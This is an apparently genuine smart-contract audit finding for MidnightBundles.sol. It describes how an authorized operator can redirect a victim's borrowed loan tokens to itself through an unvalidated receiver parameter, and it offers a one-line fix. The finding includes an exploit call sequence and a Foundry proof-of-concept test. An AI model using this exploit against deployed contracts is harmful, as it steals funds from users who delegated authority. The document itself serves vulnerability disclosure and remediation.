### Title
Authorized Caller Can Redirect Victim's sellerAssets to Attacker via Unconstrained `receiver` Parameter - (File: src/periphery/MidnightBundles.sol)

### Summary
`supplyCollateralAndSellWithUnitsTarget` checks that `msg.sender` is authorized by `taker`, but places no constraint on the `receiver` parameter that controls where the resulting sellerAssets (loan tokens) are sent. An attacker who holds `isAuthorized[victim][attacker] == true` can call the function with `taker=victim` and `receiver=attacker`, causing the victim to accumulate debt while the attacker receives all loan token proceeds.

### Finding Description
The function at `src/periphery/MidnightBundles.sol:117-169` performs the following:

1. **Authorization gate** (line 127): `require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());` — passes when `isAuthorized[victim][attacker] == true`.
2. **Takes execute** (line 154): `IMidnight(MIDNIGHT).take(..., taker, address(this), ...)` — debt is assigned to `taker` (victim); loan tokens land in the bundler (`address(this)`).
3. **Final disbursement** (line 168): `SafeTransferLib.safeTransfer(loanToken, receiver, filledSellerAssets - referralFeeAssets);` — `receiver` is an attacker-supplied address with **no validation** against `taker`.

There is no `require(receiver == taker || msg.sender == taker)` guard anywhere in the function. The `receiver` parameter is accepted verbatim from the caller.

**Exploit flow:**
- Precondition: victim has collateral on Midnight and has called `midnight.setIsAuthorized(attacker, true, victim)`.
- Attacker calls: `bundles.supplyCollateralAndSellWithUnitsTarget(targetUnits, 0, victim, attacker, [], takes, 0, address(0))`.
- Takes fill: victim's debt increases by `targetUnits`; bundler holds `filledSellerAssets` loan tokens.
- Line 168 transfers all loan tokens to `attacker`.
- Victim is left with increased debt and zero loan token compensation.

The same unconstrained `receiver` pattern exists identically in `supplyCollateralAndSellWithAssetsTarget` (line 307). [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
The victim's sellerAssets (loan tokens earned by selling/borrowing against their collateral) are transferred to the attacker's address. The victim bears the full debt obligation with no proceeds, constituting a direct theft of the loan tokens that should flow to the taker or an address the taker explicitly chose.

### Likelihood Explanation
The precondition — `isAuthorized[victim][attacker] == true` — is the intended mechanism for delegating bundler operations (e.g., a user authorizes a smart-contract operator or a UI-controlled EOA). Any user who has authorized another address on Midnight for legitimate bundler use is exposed. The attack is repeatable as long as the authorization persists, requires no special privileges, and costs only gas.

### Recommendation
Add a guard that restricts `receiver` to `taker` whenever the caller is not the taker:

```solidity
require(msg.sender == taker || receiver == taker, Unauthorized());
```

Apply the same fix to `supplyCollateralAndSellWithAssetsTarget`. [4](#0-3) [5](#0-4) 

### Proof of Concept
```solidity
function testReceiverRedirectExploit() public {
    uint256 units = 100e18;
    offers[0].maxUnits = units;

    // Victim already has collateral on Midnight.
    collateralize(market, victim, units);

    // Victim authorizes attacker on Midnight (normal delegation).
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    Take[] memory takes = new Take[](1);
    takes[0] = Take({offer: offers[0], units: units, ratifierData: hex""});

    uint256 attackerBalanceBefore = loanToken.balanceOf(attacker);

    // Attacker calls with taker=victim, receiver=attacker.
    vm.prank(attacker);
    midnightBundles.supplyCollateralAndSellWithUnitsTarget(
        units, 0, victim, attacker, new CollateralSupply[](0), takes, 0, address(0)
    );

    // Assertions:
    // Victim has debt but received no loan tokens.
    assertGt(midnight.debtOf(id, victim), 0, "victim has debt");
    assertEq(loanToken.balanceOf(victim), 0, "victim received nothing");
    // Attacker received all sellerAssets.
    assertGt(loanToken.balanceOf(attacker), attackerBalanceBefore, "attacker stole sellerAssets");
    assertEq(loanToken.balanceOf(address(midnightBundles)), 0, "no bundler residual");
}
```

### Citations

**File:** src/periphery/MidnightBundles.sol (L117-128)
```text
    function supplyCollateralAndSellWithUnitsTarget(
        uint256 targetUnits,
        uint256 minSellerAssets,
        address taker,
        address receiver,
        CollateralSupply[] memory collateralSupplies,
        Take[] memory takes,
        uint256 referralFeePct,
        address referralFeeRecipient
    ) external {
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
        require(referralFeePct < WAD, PctExceeded());
```

**File:** src/periphery/MidnightBundles.sol (L152-160)
```text
            try IMidnight(MIDNIGHT)
                .take(
                    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
                ) returns (
                uint256, uint256 resSellerAssets
            ) {
                filledUnits += unitsToTake;
                filledSellerAssets += resSellerAssets;
            } catch {}
```

**File:** src/periphery/MidnightBundles.sol (L165-168)
```text
        uint256 referralFeeAssets = filledSellerAssets.mulDivDown(referralFeePct, WAD);
        require(filledSellerAssets - referralFeeAssets >= minSellerAssets, SellerAssetsTooLow());
        if (referralFeeAssets > 0) SafeTransferLib.safeTransfer(loanToken, referralFeeRecipient, referralFeeAssets);
        SafeTransferLib.safeTransfer(loanToken, receiver, filledSellerAssets - referralFeeAssets);
```

**File:** src/periphery/MidnightBundles.sol (L252-263)
```text
    function supplyCollateralAndSellWithAssetsTarget(
        uint256 targetSellerAssets,
        uint256 maxUnits,
        address taker,
        address receiver,
        CollateralSupply[] memory collateralSupplies,
        Take[] memory takes,
        uint256 referralFeePct,
        address referralFeeRecipient
    ) external {
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
        require(referralFeePct < WAD, PctExceeded());
```
